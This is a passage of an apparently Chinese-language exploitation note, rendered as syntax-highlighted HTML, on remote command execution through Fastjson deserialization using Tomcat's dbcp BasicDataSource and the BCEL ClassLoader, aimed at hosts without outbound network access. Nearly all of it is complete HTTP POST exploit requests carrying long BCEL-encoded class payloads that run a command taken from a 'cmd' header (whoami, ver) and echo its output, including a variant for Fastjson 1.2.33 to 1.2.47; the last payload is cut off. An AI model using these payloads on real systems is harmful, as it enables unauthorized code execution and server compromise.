style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">可用于解决不出网利用。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">需要注意在Java 8u251以后，bcel类被删除。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tomcat7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.apache.tomcat.dbcp.dbcp.BasicDataSource</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tomcat8及其以后</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.apache.tomcat.dbcp.dbcp2.BasicDataSource</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Poc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;x&quot;:{</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                &quot;driverClassLoader&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$...&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    }: &quot;x&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">执行命令回显.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">POST /json HTTP/1.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Host: 127.0.0.1:9092</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Content-Type: application/json</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">cmd: whoami</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Content-Length: 3327</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;x&quot;:{</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                &quot;driverClassLoader&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    }: &quot;x&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">POST /json HTTP/1.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Host: 127.0.0.1:9092</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Content-Type: application/json</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">cmd: ver &amp;&amp; echo fastjson</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Content-Length: 3327</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;x&quot;:{</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                &quot;driverClassLoader&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hKs$83m$f5$I$de$e3$e8DM$W$81$f7$A$qaU$G$db$b6$8f$3fu$b3$w$3c$fd$85$f6$I$bf$I1$bd$87$8eX$96$a1$dag$IzY$a6$bb0$3d7$P$c4$j$b3$c7$bb$pZm$ab$d7$b4$9d$D$y$x$T$c4$e7$fau$9b$ebXMV$9fi$d7$eb$e2j$Z$eb$f9$ebD$rc$9c$c6z$k$W$b5$yf$98$ae$ef$K$fe$b7$d7$96$889$RQ$e7Uqc$8dNBc$b8$a6$96$c5$3dk$ee7$N$be$3a$s$d0$95V$89JQ$3bFRjQ$c2$qJj$8c$f5$s$I2$e2$84$8e$u$i$95$c6$d4M$db$e0$f1$f2$d2$8c$h$Z$a4$f3$ce$d5$Sqs$8d$Z$8d$f4xy$7f$T$r$d3$8b$81$b0$wf$ee$e7$8d$p$bb$c8$8f$c6nx$H$a4I$I$ec$8a$s$e2$bc$ea$CF$d4$S$ce$_$a0$rk$d2$af6Z7$a3$b4$ecfI$9c$c7$8b$d5$ab$a3$R$f7$89$e3$_$dd$s8$fb$c8$e9$G$M$dc$MM2$d3$c4$b6$f5$D$ee$b3$8a$B$cd$e3$f1p$82H2$bc$e4$K$89$3cc$ee$d1$ae1$F$a1h$7c$d2$a5$5e$80$98$c5gh1$9f$e52$UqCB$c2Z$ce$b2$d0$c09$_K$8e$Vq$ff$b9$fd$86T$cf$db$c3$edy$df$ba$7d$ab$db$Hx$96$d70$db0gI$f2$c8b$bf$bc$fc$i$qi$IY$fc$7c$X$e0$dfz$O$81$nd$PB$O$wI$e4$MA$V$c3$5cw$a8$N$40iZ$90$c4$a4aL$f6$N$p$ff$yyMC$F$l$d4y$f0$a1$9d$dc$aa$90$cbv2$9f$fc$F$94$h$84$86$v$a4$I$d1$KAWD$caB$y$e4$83$7d$JJP$8b$Z$d8D$eai$d4c$nOl$c6$W$f2$a3F$b8$H$5b$d9o$e3$97$8f$ac$e7yH$92$b1$5d4$3b$fcP$c5$dd$cb$Ta$97$o$cb$3dQ$5c$3e$82$bcAd$97$tQp$M$B$ff$Zo$i$dc$e2$3b$c3$5dO$b3$m$r$A$b7a$S$ffS$e4c$Ou$98$ebJ$d7$3c$Ox$b9$eb$p$n$d3$8f$acI$Sv$K$8fI$5c$GE$f2$o$f1Df$3d$82l$c1H$aa$y$c9_r$g$93$H$915$o$3c$e4$h$81$ffl$f90$a6$i$97B$5c$bb$8c$87$G$a1R$85$a9I$84$8e$e1$409$fd$cb$85$e04$ffS$u$dc$ea$LN$P$tQT$ceI1$t$r$9c$cc$b8$84$e9C$b8e$Q$b7$5c$86$w$a21$802$f2$n$83$e0$ad$3e$9e$nys$F$X8$$$s5C$c5P4$7b$84$8b$9b$x$92$985$80r$d1$cf$Z$c0l$d1$cf$h$401$d5$ba$8c$a9$83$d0$ae$x$oS$R$9f$abs$b7$absG$f0$f6a$ccO$a24X$96D$f91$u$c1$F$D$I$E$x$9ay$uX$99$SL$ca$94$d8K$a8j$a9$bc$80$ea$ad$c3XHU$93X$94$c4$e2$8asxQpI$Sw$q$b14$89$3b$x$93$b8$8b$df$b2$B$f8$9b$cf$96$97$f8w$ba8$J$a0$D$P$e0$m$fd$bf$I$P$e3Q$c6$40$f4G$f8$bfN$f4$t$Y$8b$Ri$a64$87$fb$5e$b4$k$e7$K0$9fQ$x$r$82$ca$Z$9f$F$a8$q$82$W$R$M$9b$88$96$ed$iu$e0$O$d8XJ$be$b5$e4$7c$t$fa$b1$8c$bc$ea$c9$fdn$i$c2$K$3c$c6$f1$R$ac$c4Q$ac$c2$T$i$9f$40$jN2$9b$9e$e4$f84$b3$u$c9$i$3a$cf$8c$Za$be$5ca$c6$5cE$8b4$9d$8f$d3$Zh$95f$oLm$da$a4$b9h$97$e6a$8bTAD$K$b4$ec$40$OeN$a2l$83$80$e8wQ$db$c9$d1$nwdrt$d4$j$ed$e2$e8$a4$3b$ea$e2$e8$K$a5vSB$We$94$o$82$dd$b4$92$Q$c2$k$Xsb$UE$Pq$u$d0W$8a$fc$m$fe$85$96$9d2b$fe$d52$acu2z$f9$ed$95$a7$cd$ac$93a$3f$87$b5$dc$Ba$u$Q$9a$93E$s$e0q$81$d2$f8$uJ$a5$7b$d8k$5c$eb$X$91$Xp$a8i$a9$bc$b8$d4$ef$5b$g$I$FB$feS0$xC$81$c55$d9E$d9$fe$qj$a5$g$b9H$a4$cbr$f6$b2$8b$94$bb$8fC$x$92K$86$b1b$A$d5E$f2$r$ac$e4$afF$vR$$$$$cd$f1$zUCj$u$e7$U$a6$V$v$nuqMnQ$ae$m$ecW$a5$81$e7$9f$rxj$94$fe$A$87$c7$vt$d5$d6$e6$cb$cf$3f$u$8a$c4$7cXt$dbhpW3$B$85$x$DL$e4$5b$99asi$ca$7c$ba$b4$9a$ae$ac$a1$T$eb$e94$83$O$8b$b0$b7h$abM$e78$a4$bd$X$7bq$lg$H9$T$c1XA$t$Y$fc$i$ba1$97$i$9a$5d$87$ca$e4$b9$Z$J$ec$e3$O$3d$80$3e$cf$c9$iyN$O$e0$7e$ecg$d8$b3$5cwWA$f97$C2$O$5cC$ae$8c$7b$r$e9$3fX$q$e3$3e$Z$af$b8$86$C$Z$x$r$e9$w$8a$Y$86$d8$3f$c1Q$60$d4$e9$7d$v$a7$xx$e5$f5$8a$3a$db$ad$q$M$E$abc$SuC$90$cf$8a$e0$ba$sg$bb$7b$K$dbW$b9$d5$fb$fe$ff$Ctz$ebem$R$A$A&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    }: &quot;x&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java"></span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">####</span><span class="token title important"> 1.2.33 &lt;= fastjson &lt;= 1.2.47</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">POST /json HTTP/1.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Host: 127.0.0.1:9092</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Content-Type: application/json</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">cmd: whoami</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Content-Length: 3647</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &quot;xx&quot;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;@type&quot; : &quot;java.lang.Class&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;val&quot;   : &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &quot;x&quot; : {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;name&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">            &quot;@type&quot; : &quot;java.lang.Class&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">            &quot;val&quot;   : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">            &quot;c&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                &quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                &quot;driverClassLoader&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                    &quot;@type&quot; : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                &quot;driverClassName&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$